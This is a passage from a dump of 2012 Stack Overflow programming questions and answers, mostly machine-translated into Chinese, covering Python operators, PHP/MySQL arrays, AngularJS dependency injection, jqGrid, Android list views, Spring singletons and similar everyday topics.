大多数新的版本控制系统都回避悲观锁定，微软产品通常实现它（VSS/TFS）。可以在 SVN 中实现它，但正如一些评论所说，通常最好使用乐观锁定。

使用悲观锁定 1 开发人员可以随时处理文件，将其与其他人“锁定”。这消除了合并已由 >1 dev 更改的文件的可能性。

使用乐观锁定 > 1 开发人员可以随时编辑文件，唯一的“缺点”是您的开发人员可能需要合并。两者都用过，我每次都会去乐观锁定，悲观只会让人头疼。

我建议尝试解决那些让您想要使用悲观锁定而不是使用它作为绷带来试图让不可靠的开发人员正常工作的问题。你永远不知道，给他们一些自由，他们可能会让你大吃一惊！

# iphone - 使用加速度计查找步行距离

> ID：11847357
> 
> 赞同：0
> 
> 时间：2012-08-07T13:44:09.570
> 
> 标签：iphone

需要制作一个应用程序，用户可以在其中找到两点之间的步行距离。

这个概念就像用户将启动应用程序并开始步行，在采取一些步骤后，他将单击一些按钮，该按钮将向他显示他从刚刚启动应用程序的点走过的距离。到他停下的地方。

我知道我们可以通过使用 CLLocation 类找到两个位置之间的距离，但挑战是要获得高达 3 米的准确测量值。

即使我不确定我们是否可以使用加速度计，如果我处于休息状态，加速度计只会检测到重力加速度。这显然将步行距离设置为 0，所以不知道我将如何检测起点。

任何关于相同的提示/建议对我都有很大的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T17:13:37.237

检查这个：[iphone加速度计速度和距离](https://stackoverflow.com/questions/3177199/iphone-accelerometer-speed-and-distance/)

据我所知，使用加速度计几乎不可能获得关于距离的准确结果。

# python - 具有可变数学运算符的 Python if 语句

> ID：11847359
> 
> 赞同：17
> 
> 时间：2012-08-07T13:44:20.330
> 
> 标签：python, parsing, if-statement, operators, mathematical-expressions

我正在尝试将变量数学运算符插入到 if 语句中，这是我在解析用户提供的数学表达式时尝试实现的示例：

```
maths_operator = "=="

if "test" maths_operator "test":
       print "match found"

maths_operator = "!="

if "test" maths_operator "test":
       print "match found"
else:
       print "match not found" 
```

显然以上失败了`SyntaxError: invalid syntax`。我试过使用 exec 和 eval 但在 if 语句中都不起作用，我有什么选择来解决这个问题？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-08-07T13:50:20.637

使用操作符包和字典来根据它们的文本等价物查找操作符。所有这些都必须是一元或二元运算符才能始终如一地工作。

```
import operator
ops = {'==' : operator.eq,
       '!=' : operator.ne,
       '<=' : operator.le,
       '>=' : operator.ge,
       '>'  : operator.gt,
       '<'  : operator.lt}

maths_operator = "=="

if ops[maths_operator]("test", "test"):
    print "match found"

maths_operator = "!="

if ops[maths_operator]("test", "test"):
    print "match found"
else:
    print "match not found" 
```

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2012-08-07T13:45:58.030

使用[`operator`](http://docs.python.org/library/operator)模块：

```
import operator
op = operator.eq

if op("test", "test"):
   print "match found" 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-14T13:21:49.767

> 我试过使用 exec 和 eval 但在 if 语句中都不起作用

为了完整起见，应该提到它们确实有效，即使发布的答案提供了更好的解决方案。您必须 eval() 整个比较，而不仅仅是运算符：

```
maths_operator = "=="

if eval('"test"' + maths_operator '"test"'):
       print "match found" 
```

或执行该行：

```
exec 'if "test"' + maths_operator + '"test": print "match found"' 
```

# flash-cs5 - 在 Flash cs5 中旋转文本字段

> ID：11847360
> 
> 赞同：0
> 
> 时间：2012-08-07T13:44:24.230
> 
> 标签：flash-cs5

我有一个具有抗锯齿类型“使用设备字体”的动态文本字段。当我旋转文本字段时，文本消失并在文本字段旋转到 360 度时重新出现。请建议我实现这一点的方法。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T15:06:51.880

从 Flash Player 10 开始，您可以`DisplayObjects'`通过调整它们的`rotationZ`属性来旋转。你也可以用你的`TextField`. 除此之外，您还可以使用`TextBlock`该类来相应地解析`TextLines`和旋转它们。

有关更多信息，请查看此博文：

[http://www.yswfblog.com/blog/2009/05/21/the-knack-to-rotating-dynamic-text-in-flash-10/](http://www.yswfblog.com/blog/2009/05/21/the-knack-to-rotating-dynamic-text-in-flash-10/)

这是来自同一篇博文的代码：

```
package 
{
    import flash.display.Sprite;
    import flash.text.TextField;
    import flash.text.TextFormat;
    import flash.text.engine.*;

    public class TextTest extends Sprite 
    {
        public function TextTest () 
        {
            for (var i:int = 0; i &lt;= 20; i++) 
            {
                var txt:TextField = new TextField();
                txt.selectable = false;
                txt.width = 300;
                txt.height = 100;
                txt.text = "Hello world!";
                txt.setTextFormat(new TextFormat("Georgia", 2 + 2*i));

                txt.x = 6*(i*(i+1)/2);
                txt.y = 30;
                txt.rotationZ = 20;
                addChild(txt);
            }

            for (var j:int=0; j&lt;=20; j++) 
            {
                trace(j);
                var myString:String = "Hello world!";
                var myFormat:ElementFormat = new ElementFormat();

                var myFontDesc:FontDescription = new FontDescription("Georgia");
                myFormat.fontSize = 2 + 2*j;
                myFormat.fontDescription = myFontDesc; 

                var textElement:TextElement = new TextElement(myString, myFormat);
                var textBlock:TextBlock = new TextBlock();
                textBlock.content = textElement; 

                var myTextLine:TextLine = textBlock.createTextLine(null, 300); 

                myTextLine.x = 6*(j*(j+1)/2);
                myTextLine.y = 150;
                myTextLine.rotation = 20;

                addChild(myTextLine);
            }
        }
    }
} 
```

# flexigrid - 使用javascript刷新flexigrid

> ID：11847370
> 
> 赞同：2
> 
> 时间：2012-08-07T13:45:06.973
> 
> 标签：flexigrid

在下拉（选择）索引更改时刷新 flexigrid 数据或在 javascript 中的索引更改时重新绑定 flexigrid 或在选择更改时清除 flexigrid 数据

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T11:10:14.090

如果您只是想将网格的刷新与另一个元素绑定，您可以使用

```
$('#flex1').flexReload() 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-10T07:05:50.017

我做了以下事情。在严重性的选择更改时，flexigrid 重新加载所选严重性的数据

```
<select id='ddlSeverity' onchange="setSeverity($('#ddlSeverity option:selected').attr('value'));">
                            <option value="1">Severity 1</option>
                            <option value="2">Severity 2</option>
                            <option value="3">Severity 3</option>
                            <option value="4">Severity 4</option>
</select>

$(document).ready(function () {

 function setSeverity(severity) {
//Construct the URL to be called. 
        var urlAction = '@Url.Action("RequestQueueBySeverity", "Home", new { severity = "__BOGUS__" })';
//Replace the bogus parameter with the parameter to be passed
        urlAction = urlAction.replace("__BOGUS__", severity);

        $('#flex1')
        .flexOptions({
            url: urlAction,
            newp: 1
        }).flexReload();
    }

} 
```

如果对您有用，请标记为答案..

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-02T16:26:37.653

为了有效地重新加载，您可以尝试以下操作：

```
$("#flexigrid")[0].grid.populate() 
```

# php - Make an array from SQL query

> ID：11847373
> 
> 赞同：1
> 
> 时间：2012-08-07T13:45:20.963
> 
> 标签：php, mysql, sql

I'm trying to go to my DB, get info from a bunch of columns based on two variables, and return all the values of all of those columns into a php list (or array), so for example, the final result would be something like `$output = array($foo,$bar,$hello);`

Here is the code I have right now to connect to the DB and my query, I know I am missing the vital code here, hoping someone can help me, thanks.

```
<? php

$var1 = 20.0;
$var2 = 15.0;

function getFromDB($var1, $var2){

mysql_connect("localhost", "test", "test") or die (mysql_error());
mysql_select_db("test") or die(mysql_error());
$queryString = "SELECT * from table1 WHERE foo=".$var1."AND bar=".$var2;
$go = mysql_query($queryString);
while($row = mysql_fetch_array($go)){
echo $row['col1']; 
echo $row['col2'];
echo $row['col3'];

}
}

getFromDB($var1,$var2);
?> 
```

The idea is to have the values of col1, 2, and 3 in an array. Thanks! Sam

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T13:50:00.583

Either one of these will work:

```
while($row = mysql_fetch_array($go)){
  $output[] = array($row['col1'], $row['col1'], $row['col1']);
} 
```

or:

```
while($row = mysql_fetch_array($go)){
  $output[] = $row;
} 
```

The one you should use depends on how the $row-data looks like.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T13:47:50.777

```
$data = array ();
while ( $row = ...)
{
    // appends the contents of $row to a new value in $data
    $data[] = $row;
}

print_r ($data); // <-- to see the output 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T13:48:29.043

```
$array = array();
while ($row = mysql_fetch_array($go)) {
    $array[] = array($row['col1'], $row['col2'], $row['col3']);
} 
```

Please note that you should stop using `mysql_*` functions. They're being deprecated. Instead use [PDO](http://php.net/manual/en/book.pdo.php) (supported as of PHP 5.1) or [mysqli](http://php.net/manual/en/book.mysqli.php) (supported as of PHP 4.1). If you're not sure which one to use, [read this SO article](https://stackoverflow.com/questions/13569/mysqli-or-pdo-what-are-the-pros-and-cons).

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-07T13:50:08.153

Replace

```
echo $row['col1'];
echo $row['col2'];
echo $row['col3']; 
```

with

```
$array = $row; 
```

and return `$array`.

# javascript - Angular js $范围错误

> ID：11847376
> 
> 赞同：2
> 
> 时间：2012-08-07T13:45:26.980
> 
> 标签：javascript, angularjs

我试图使用种子应用程序使用 angular.js 站起来。

当浏览器执行我的控制器时，我收到以下错误：

```
TypeError: Cannot set property 'players' of undefined
at new bankC (http://localhost:8888/monopoly/js/controllers.js:18:20)
at invoke (http://localhost:8888/monopoly/lib/angular/angular.js:2795:28)
at Object.instantiate (http://localhost:8888/monopoly/lib/angular/angular.js:2805:23)
at http://localhost:8888/monopoly/lib/angular/angular.js:4620:24
at update (http://localhost:8888/monopoly/lib/angular/angular.js:13692:26)
at http://localhost:8888/monopoly/lib/angular/angular.js:8002:24
at Array.forEach (native)
at forEach (http://localhost:8888/monopoly/lib/angular/angular.js:110:11)
at Object.Scope.$broadcast (http://localhost:8888/monopoly/lib/angular/angular.js:8000:11)
at http://localhost:8888/monopoly/lib/angular/angular.js:7185:26 
```

这是控制器代码，它是 controller.js 文件

```
function bankC($scope) {
  $scope.players = [
      {
        id: 0,
        name: "Playe1",
        balance: 1500
      },
      {
        id: 1,
        name: "Player2",
        balance: 1500
      },
      {
        id: 2,
        name: "Player 3",
        balance: 1500
      }
  ];
}
bankC.$inject = []; 
```

谢谢

编辑：

它在某个“页面”上使用 Angular js 注册

```
angular.module('myApp', ['myApp.filters', 'myApp.services', 'myApp.directives']).
config(['$routeProvider', function ($routeProvider) {
    $routeProvider.when('/view1', {templateUrl: 'partials/partial1.html', controller: MyCtrl1});
    $routeProvider.when('/view2', {templateUrl: 'partials/partial2.html', controller: MyCtrl2});
    $routeProvider.when('/bank', {templateUrl: 'partials/bank.html', controller: bankC});
    $routeProvider.otherwise({redirectTo: '/bank'});
}]); 
```

编辑2：

删除“bankC.$inject = [];” 从控制器文件解决了问题，那么为什么 angular.js 种子应用程序包含它？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-07T14:05:55.450

由于最后一行，您收到了该错误

```
bankC.$inject = []; 
```

这告诉角度注入器在控制器查找 $scope 时不向控制器注入任何内容。

如果您将其更改为

```
bankC.$inject = ['$scope']; 
```

它应该可以正常工作。

最后一行之所以存在，是因为 Angular 使用了依赖注入。当您在控制器中请求时，Angular 会查找名称为 $scope 的变量。但是如果代码被缩小，那么混淆会将 $scope 的名称更改为其他名称。为了在发生这种情况时保持理智，引入了最后一行。每当您声明一个新控制器时，最佳做法是在最后一行包含您希望 angulars DI 注入该控制器的所有变量。

注意：如果您有兴趣将更多东西注入该控制器（或类似控制器），那么您还必须更新 bankC.$inject。

# perl - 让 github 使用 perldoc 显示 readme 文档

> ID：11847378
> 
> 赞同：4
> 
> 时间：2012-08-07T13:45:32.273
> 
> 标签：perl, github

我可以将 github 配置为显示 perldoc 中的自述文件吗？模块（.pm）已上传到那里，我只想让 github`perldoc module.pm`自动生成一些从 eg 生成的输出（我不应该一直自己更改 readme.md）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-07T13:53:57.903

[根据他们的文档](https://github.com/github/markup)，Github 会自动处理“README.pod”文件。创建和维护 README.pod 由您决定。如果您不想手动维护它，您可以考虑使用一些本地自动化工具来维护它。

单独维护 README 有一些好处。例如，Perl 模块的 POD 通常不包含安装说明，但这些将是您希望在 README 文件中找到的第一件事。

# jqgrid - 启用 JqGrid 下一个按钮以不返回任何值

> ID：11847384
> 
> 赞同：1
> 
> 时间：2012-08-07T13:45:56.880
> 
> 标签：jqgrid

当 Jqgrid 没有返回任何值时，我们会遇到问题。在这种情况下，寻呼机（jqGrid）的下一个按钮被启用。当网格为空时，我们必须禁用它。请帮助我找到解决方案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T14:00:11.190

要将下一个按钮设置为禁用，您可以执行以下操作：

```
$('#next_' + yourgridid + '_pager').addClass('ui-state-disabled'); 
```

要重新启用按钮，请执行以下操作：

```
$('#next_' + yourgridid + '_pager').removeClass('ui-state-disabled'); 
```

我建议在[loadComplete(data)](http://www.trirand.com/jqgridwiki/doku.php?id=wiki%3aevents&s%5B%5D=loadcomplete)事件中执行此操作。

```
$("#yourgridid").jqGrid({
...
   loadComplete: function(data){ 
       var records = $('#yourgridid').jqGrid('getGridParam', 'reccount');
       //note: you can also get record count via data.records or data.rows.length in this function
       if (records > 0) {
            $('#next_' + yourgridid + '_pager').removeClass('ui-state-disabled');
       } else {
            $('#next_' + yourgridid + '_pager').addClass('ui-state-disabled');
       }
   },
...
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-01T10:06:10.797

```
loadComplete: function (data) {
                  var page = $('#mygrid').jqGrid('getGridParam', 'page');
                  var lastpage = $("#mygrid").getGridParam('lastpage');
                 //note: you can also get record count via data.records or data.rows.length in this function
                if (lastpage > page) {
                     $('#next_mygridpager').removeClass('ui-state-disabled');
                     $('#last_mygridpager').removeClass('ui-state-disabled');
                 } else {
                     $('#next_mygridpager').addClass('ui-state-disabled');
                     $('#last_mygridpager').addClass('ui-state-disabled');
                 }
            } 
```

我相信这是一个更完整的解决方案，因为您也不希望在没有更多页面前进时出现下一个和最后一个按钮。

# android - Android - ListView - 按需调用 getView()

> ID：11847387
> 
> 赞同：7
> 
> 时间：2012-08-07T13:46:03.867
> 
> 标签：android, android-layout, android-intent, android-emulator, android-widget

我有一个`ListView`在每一行中显示从互联网上提取的图像和一个字符串。

一般来说，它工作正常。但是，我想控制视图（行）膨胀时的方式。默认情况下，当行可见时，`getView()`调用适配器的方法。

这当然不是最好的行为之一，因为如果我有`ListView`数百条记录，并且我需要到达底部的记录，在滚动 时，将为每一行调用 `ListView`该方法，直到到达页脚。`getView()`

所以我只想在滚动后调用 getView 并且 ListView 处于暂停/空闲状态，但我不知道如何去做：

我是这样开始的：

```
listView.setOnScrollListener(new OnScrollListener() {
    @Override
    public void onScrollStateChanged(AbsListView view, int scrollState) {
        if(scrollState==SCROLL_STATE_IDLE){
            // Invoke get view only on visible items
        }
    }

    @Override
    public void onScroll(AbsListView view, int firstVisibleItem,
            int visibleItemCount, int totalItemCount) {

    }
}); 
```

这是我的适配器的 getView：

```
@Override
public View getView(int position, View convertView, ViewGroup parent) {

    ViewHolder holder;

    if (convertView == null) {
        convertView = mInflater.inflate(R.layout.row, parent, false);

        holder = new ViewHolder();
        holder.title = (TextView) convertView.findViewById(R.id.textView);
        holder.image = (ImageView) convertView.findViewById(R.id.imageView);
        holder.position = position;

        convertView.setTag(holder);
    } else {
        holder = (ViewHolder) convertView.getTag();
    }

    holder.title.setText(data.get(position).getTitle());
    holder.image.setImageResource(R.drawable.ic_launcher);
    new LoadImageAsync(data.get(position).getUrl(), holder.image).execute();

    return convertView;
} 
```

请给我一些关于我应该在哪里查看以实现此目的的指示：仅在滚动后调用 getView()，并且仅适用于可见项目。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-07T14:15:48.563

我最近读了一篇关于这个的文章...... [在这里](http://www.programmingmobile.com/2012/03/buttery-smooth-list-scrolling-in.html)。我没有尝试过，但它似乎是一个合理的理论。

基本上，他们提倡添加一个布尔值，用于跟踪您是否正在滚动，并将其用作适配器中的标志。如果布尔值为真（您正在滚动），则仅在布局中绘制文本视图。如果为 false（您已停止滚动），您将绘制所有内容。

您告诉适配器在不滚动时使用`notifyDataSetChanged()`.

# javascript - 通过javascript更改-webkit-mask-position

> ID：11847391
> 
> 赞同：3
> 
> 时间：2012-08-07T13:46:13.227
> 
> 标签：javascript, css, mask, css-mask

我正在开发一个 iPad webview 项目，该项目需要一个滑块在两张图片上来回移动，在向左或向右滑动时显示一张或另一张。由于项目限制，我无法使用 jQuery。我目前在顶部有左图，上面有一个透明蒙版，当 -webkit-mask-position 增加时，它会显示更多的底部图片，当减少时，会显示更多的顶部（覆盖底部）。

我正在使用一个名为 Draggy ( [https://github.com/jofan/Draggy](https://github.com/jofan/Draggy) ) 的 javascript 插件来回移动滑块，并希望使用其 onChange 函数调用来更新蒙版的位置，但我不能找出javascript调用“-webkit-mask-position”来挽救我的生命。

有任何想法吗？

PS：webkitMaskPosition 将 style="-webkit-mask: XX" 添加到元素中，我可以使用它（在 js 中填充其他值），但它确实有问题。我现在正在调查它。

哦，伙计，我明白了。

```
var maskSlider = document.getElementById('molecule');
function moveMask(x, y) {
    var xx = x - 285;
    var z = "-webkit-gradient(linear, left center, right center, color-stop(0.5, black), color-stop(0.5, transparent)) no-repeat scroll " + xx + "px padding padding";
    maskSlider.style.webkitMask = z;
} 
```

-285 是让它与滑块在图像上的位置对齐。我不知道我是否真的以正确的方式做这件事，但它奏效了。如果有人能想到更好/更有效的方法来做到这一点，请告诉我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-18T04:52:17.913

我最近做了很多关于使用 CSS3 渐变在图像之间进行转换的 webkit 掩码。`style`我更喜欢将标签附加到`head`由我的计算动态生成的标签上。而且我也使用了 CSS3 动画。像这样的东西：

```
 var cssStr = '<style id="myTransition">.myTransition_wipe{' +
                '-webkit-mask-size: 200% 200%;' +
                '-webkit-mask-repeat: no-repeat;' +
                '-webkit-animation: wipe 2s;' +
                '-webkit-animation-direction: normal;' +
                '-webkit-animation-iteration-count: 1;' +
                '-webkit-animation-fill-mode: forwards;' +
                '-webkit-mask-position: offsetLeftS 0;' +
                '-webkit-mask-image: -webkit-gradient(linear, left top, right top, ' +
                'color-stop(0%, transparent), color-stop(20%, transparent), ' +
                'color-stop(25%, transparent), color-stop(30%, transparent), ' +
                'color-stop(50%, rgba(0, 0, 0, 1)), color-stop(98%, rgba(0, 0, 0, 1)), ' +
                'color-stop(100%, rgba(0, 0, 0, 1)));}' +
                '@-webkit-keyframes wipe {' +
                '0% { -webkit-mask-position: offsetLeftS 0; }' +
                '100% { -webkit-mask-position: offsetLeftD 0; }' +
                '}' +
                '</style>';
            var compStyle = getComputedStyle(currentElement);
            var width = parseInt(compStyle.getPropertyValue("width"));
            var height = parseInt(compStyle.getPropertyValue("height"));
            cssStr = cssStr.replace(/offsetLeftS/g, '-' + (width * 1) + 'px');
            cssStr = cssStr.replace(/offsetLeftD/g, '+' + (width * 1) + 'px');

            $('head').append(cssStr); 
```

当我想应用转换时，我`style`通过它的 ID 删除标签并`myTransition_wipe`从元素中删除类，然后将一个新的附加到`head`标签并将类名也添加到元素。

**注意：**您必须存储动画完成后元素应具有的样式，并在动画完成后立即添加它们。否则，当您删除类名和样式标签时，一切都将被重置。

祝你好运

# java - 具有私有构造函数的单例类的 Spring（创建 bean 时出错，没有可见的构造函数）

> ID：11847395
> 
> 赞同：3
> 
> 时间：2012-08-07T13:46:17.327
> 
> 标签：java, spring, apache-camel

我有 4 个带有私有构造函数的单例类，我正在尝试为所有 4 个类创建 bean 属性。

主要问题是，我能够为 3 个类创建 bean，这 3 个类具有类似的结构，具有 getInstance 方法和私有构造函数（）（Singleton 类），但第四个也是最后一个抛出异常（Exception消息粘贴在下面）

请在下面找到 getInstance 方法、私有构造函数和 bean id 声明。这在所有四个 bean 声明中都是相同的

但是，如果我将构造函数从“私人”更改为“公共”，那么我不会收到错误消息。任何人都可以对正在发生的事情有所了解吗？由于其他三个类具有私有构造函数并且它们工作得很好

getInstance() 方法

```
public static ApplicationConfiguration getInstance() throws IOException,
            IllegalArgumentException, InconsistentDataException {
        ApplicationConfiguration result = instance.get();
        if (result == null) {
            try {
                // Check again if already created
                result = instance.get();
                if (result == null) {
                    result = new ApplicationConfiguration();

                }
            } finally {
                // something here
            }
        } 
        return result;
    } 
```

私有构造函数

```
private ApplicationConfiguration() throws Exception {
        // call a method here
    } 
```

bean 属性声明

```
<bean id="configManager" class="com.manager.ApplicationConfiguration" factory-method="getInstance" />

<bean id="configEnricher" class="com.enricher.ApplicationConfiguration" factory-method="getInstance" />

<bean id="configBussiness" class="com.validationservice.ApplicationConfiguration" factory-method="getInstance" /> 
```

以上三部作品

此 bean 属性引发错误

```
<bean id="configEviction" class="com.evictionservice.ApplicationConfiguration" factory-method="getInstance" /> 
```

异常消息

```
[#|2012-08-07 11:53:21,130|ERROR|RMI TCP Connection(226)-172.18.36.14|org.springframework.
web.context.ContextLoader||slodev-rhngp5.mblox.com|core-1|Context initialization failed|#]
org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'co
nfigEviction' defined in ServletContext resource [/WEB-INF/camel-context.xml]: Initializat
ion of bean failed; nested exception is org.springframework.aop.framework.AopConfigExcepti
on: Could not generate CGLIB subclass of class [class com.evictionservice.ApplicationConfiguration]: 
Common causes of this problem include using
a final class or a non-visible class; nested exception is java.lang.IllegalArgumentExcepti
on: No visible constructors in class com.evictionservice.ApplicationConfiguration
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.do
CreateBean(AbstractAutowireCapableBeanFactory.java:526)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.cr
eateBean(AbstractAutowireCapableBeanFactory.java:455)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(Abstr
actBeanFactory.java:293)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingl
eton(DefaultSingletonBeanRegistry.java:222)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(Abstrac
tBeanFactory.java:290)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractB
eanFactory.java:192)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstant
iateSingletons(DefaultListableBeanFactory.java:585)
        at org.springframework.context.support.AbstractApplicationContext.finishBeanFactor
yInitialization(AbstractApplicationContext.java:895)
        at org.springframework.context.support.AbstractApplicationContext.refresh(Abstract
ApplicationContext.java:425)
: 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-07T13:58:45.163

问题不在于 bean 创建本身（正如您已经注意到的，这与其他 bean 没有什么不同）。该问题似乎与您尝试使用的某些 AOP 配置有关。如果你想为那个类创建一个代理，它不能用 CGLIB 来做，因为这个类不能被子类化（因为它有一个私有构造函数）。

解决这个问题的唯一方法（给定您当前的设计）是创建一个将由 ApplicationConfiguration 类实现的接口，然后为该接口创建代理而不是代理该类。

# vb.net - 从 vb.net 项目中检索图标

> ID：11847402
> 
> 赞同：0
> 
> 时间：2012-08-07T13:46:24.507
> 
> 标签：vb.net, vb.net-2010

我有一个现有的 vb.net 项目（vb.net 2010）。项目中有一个带有图标的表单；我想得到那个图标，这样我就可以在我添加到同一个项目中的另一种形式中使用它。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T15:53:17.120

如果您可以在代码中执行此操作，则只需将以下行放入`Form2`'s`Load`事件中：

`Form2.Icon = Form1.Icon`.

-

但是，如果您想将图标添加到您的设计器中，则需要做更多的工作。

首先，您需要将`Form1`图标保存到文件中。然后你可以使用设计器的图标选择器来选择它。

这是您需要在其中运行`Form1`以将其保存到文件的代码：

```
 Using writeStream As Stream = File.Create("C:\temp\tmpIcon.ico")
      Me.Icon.Save(writeStream)
    End Using 
```

您可以在上面创建一个临时按钮`Form1`并将上述代码放入按钮的 Click 事件处理程序中。

# java - java.lang.IllegalStateException：操作栏选项卡必须有回调

> ID：11847403
> 
> 赞同：18
> 
> 时间：2012-08-07T13:46:27.093
> 
> 标签：java, android-actionbar, illegalstateexception

我正在尝试向`ActionBarSherlock`我的应用程序添加一个带有 4 个选项卡的选项卡。我试图从 SherlockActivity `then`SherlockFragmentActivity` 扩展，但我仍然得到这个异常：

> java.lang.IllegalStateException：操作栏选项卡必须有回调。

```
 import java.io.IOException;
    import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpParams;
import org.apache.http.params.HttpProtocolParams;
import org.json.JSONArray;
import org.json.JSONObject;

import com.actionbarsherlock.app.ActionBar;
import com.actionbarsherlock.app.ActionBar.Tab;
import com.actionbarsherlock.app.ActionBar.TabListener;
import com.actionbarsherlock.app.SherlockActivity;
import com.actionbarsherlock.app.SherlockFragmentActivity;
import com.actionbarsherlock.view.Menu;
import com.actionbarsherlock.view.MenuInflater;
import com.actionbarsherlock.view.MenuItem;

import twitter4j.Status;
import twitter4j.Twitter;
import twitter4j.TwitterException;
import twitter4j.TwitterFactory;
import twitter4j.auth.AccessToken;
import twitter4j.auth.RequestToken;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.StrictMode;
import android.preference.PreferenceManager;
import android.support.v4.app.FragmentTransaction;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.View.OnClickListener;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

public class HomeActivity extends SherlockFragmentActivity implements OnClickListener, OnItemClickListener, TabListener {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        setContentView(R.layout.homelayout);
        try{

            ActionBar actionBar = getSupportActionBar();
            actionBar.setDisplayHomeAsUpEnabled(true);
            actionBar.setNavigationMode(ActionBar.NAVIGATION_MODE_TABS);

            Tab homeTab = actionBar.newTab();
            homeTab.setIcon(R.drawable.tab_home);
            Tab exploreTab = actionBar.newTab();
            exploreTab.setIcon(R.drawable.tab_explore);
            Tab leaderBoardTab = actionBar.newTab();
            leaderBoardTab.setIcon(R.drawable.tab_leaderboard);
            Tab profileTab = actionBar.newTab();
            profileTab.setIcon(R.drawable.tab_profile);

            actionBar.addTab(homeTab);
            actionBar.addTab(exploreTab);
            actionBar.addTab(leaderBoardTab);
            actionBar.addTab(profileTab);
                     }catch(Exception ex){

            Log.e("error from onCreate" , ex.toString());
            Log.e("error from onCreate" , ex.getStackTrace().toString());
            }

               }

    @Override
    public void onTabSelected(Tab tab, FragmentTransaction ft) {
        // TODO Auto-generated method stub

    }

    @Override
    public void onTabUnselected(Tab tab, FragmentTransaction ft) {
        // TODO Auto-generated method stub

    }

    @Override
    public void onTabReselected(Tab tab, FragmentTransaction ft) {
        // TODO Auto-generated method stub

    }
} 
```

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2012-08-09T14:05:45.697

您必须先在 Tab 上注册 ActionBar.TabListener，然后才能将其添加到 actionBar。

在你的情况下：

```
Tab homeTab = actionBar.newTab();
homeTab.setTabListener(this) //'this' because your activity implements a TabListener
...
actionBar.addTab(homeTab); 
```

否则我会建议你在他们自己的类中实现你的监听器，这样你的 Activity 就不会失去它的目的，并且也很容易理解和阅读。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-22T21:46:29.653

**您可以像这样重复选项卡侦听器**

```
 ActionBar.Tab tab1 = actionBar.newTab();
    tab1.setText("Tab 1");
    tab1.setTabListener(this);

    ActionBar.Tab tab2 = actionBar.newTab();
    tab2.setText("Tab 2");
    tab2.setTabListener(this);

    ActionBar.Tab tab3 = actionBar.newTab();
    tab3.setText("Tab 3");
    tab2.setTabListener(this); **// this is must be tab3 not tab2** 
```

# ios - Flex 移动项目：在 iOS 上的 Native Reader 中打开 PDF

> ID：11847405
> 
> 赞同：0
> 
> 时间：2012-08-07T13:46:39.040
> 
> 标签：ios, apache-flex, pdf, mobile, native

我正在为 iPad (iOS) 开发一个 Flex 移动项目，我需要在本机 PDF 阅读器中打开一个 PDF 文档。

我想我需要与原生扩展集成。

有人做过这样的事吗？

感谢您的建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T00:35:34.413

你试过这个吗？

```
var myFileName:String = 'myFile.pdf';
var localFile:File = File.documentsDirectory.resolvePath('myAppFolder/'+myFileName);
localFile.openWithDefaultApplication() 
```

也许这可以帮助你！

# xcode - 有没有办法让 XCode 在下载文档/API 更新之前询问？

> ID：11847409
> 
> 赞同：1
> 
> 时间：2012-08-07T13:46:59.257
> 
> 标签：xcode, xcode4

默认情况下，XCode 设置为下载与应用程序可用的各种文档和 API 库相关的更新。这[可以](https://stackoverflow.com/questions/5174024/download-of-cocoa-api-documentation)从 XCode 首选项屏幕中禁用。但是，我不想禁用自动更新，而是提示我启动更新，以便我可以在以后关闭它们以供下载。

